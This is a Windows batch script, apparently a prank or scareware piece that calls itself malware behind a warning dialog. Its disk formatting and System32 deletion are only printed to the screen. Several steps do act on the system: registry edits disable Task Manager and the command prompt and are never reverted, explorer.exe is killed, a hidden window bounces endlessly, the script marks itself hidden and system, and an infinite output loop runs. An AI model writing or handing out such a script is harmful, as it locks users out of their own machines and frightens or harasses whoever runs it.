@echo off
setlocal
title CRITICAL SYSTEM TERMINATION

:: 1. Warning Dialog (DANGER!)
powershell -Command "$result = [System.Windows.Forms.MessageBox]::Show('Are you sure to run this?`nIts malware Im not responsible for any damage', 'DANGER!', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Error, [System.Windows.Forms.MessageBoxDefaultButton]::Button2); if ($result -eq 'No') { exit 1 } else { exit 0 }"
if %errorlevel% neq 0 exit

:: 2. Hard Lockdown (TaskMgr & CMD)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1

:: 3. PC CRASHING Bouncing Window (Fast & Unstoppable)
start /b powershell -WindowStyle Hidden -Command "$f=New-Object Windows.Forms.Form; $f.Text='PC CRASHING'; $f.BackColor='Purple'; $f.ControlBox=$false; $f.Size='300,150'; $f.TopMost=$true; $f.Show(); $s=[Windows.Forms.Screen]::PrimaryScreen.Bounds; $vx=35; $vy=35; while($true){ $f.Left+=$vx; $f.Top+=$vy; if($f.Left -le 0 -or $f.Right -ge $s.Width){$vx=-$vx}; if($f.Top -le 0 -or $f.Bottom -ge $s.Height){$vy=-$vy}; [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -m 5 }"

:: 4. Real-time Disk Formatting Simulation (D, E, F, etc.)
color 0A
cls
echo [!] DISK WIPEOUT INITIALIZED...
timeout /t 2 >nul
:: Pętla symulująca formatowanie wielu dysków
for %%d in (D E F G H I) do (
    echo [!] PREPARING DRIVE %%d:\ ...
    timeout /t 1 >nul
    echo [!] COMMAND: format %%d: /FS:NTFS /Q /Y
    echo Erasing MFT on volume %%d:...
    echo [##########] 100%% - DRIVE %%d: WIPED.
    echo.
)
timeout /t 1 >nul

:: 5. "Hacker Style" System32 Deletion (Vivid Simulation)
color 0C
cls
echo [!] ACCESSING TARGET: C:\Windows\System32
echo [!] DESTRUCTION PROTOCOL 0x8821 STARTED...
timeout /t 2 >nul

:: Ta pętla skanuje prawdziwe pliki System32 i wyświetla ich ścieżki (wygląda jak kasowanie)
for /r C:\Windows\System32 %%f in (*.dll, *.exe, *.sys) do (
    echo DELETING [KERNEL32]: %%f
    :: Bardzo szybki przelot tekstu dla efektu "hakerskiego"
    powershell -Command "Start-Sleep -m 1"
)

:: 6. The Final Blow (Kill Shell & Self-Hide)
cls
echo [!!!] SYSTEM32 SUCCESSFULLY DELETED [!!!]
echo [!!!] ALL DATA ENCRYPTED AND REMOVED [!!!]
timeout /t 3 >nul
:: Znika pulpit i pasek zadań
taskkill /f /im explorer.exe >nul 2>&1

:: Symulacja "samousunięcia" (plik staje się ukryty i systemowy)
attrib +h +s "%~f0"

:: 7. Final Message Box
powershell -Command "[Windows.Forms.MessageBox]::Show('PC CRASHED. NO OPERATING SYSTEM DETECTED.', 'FATAL ERROR', 0, 16)"

:: 8. Infinite Matrix Loop
:matrix
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
goto matrix
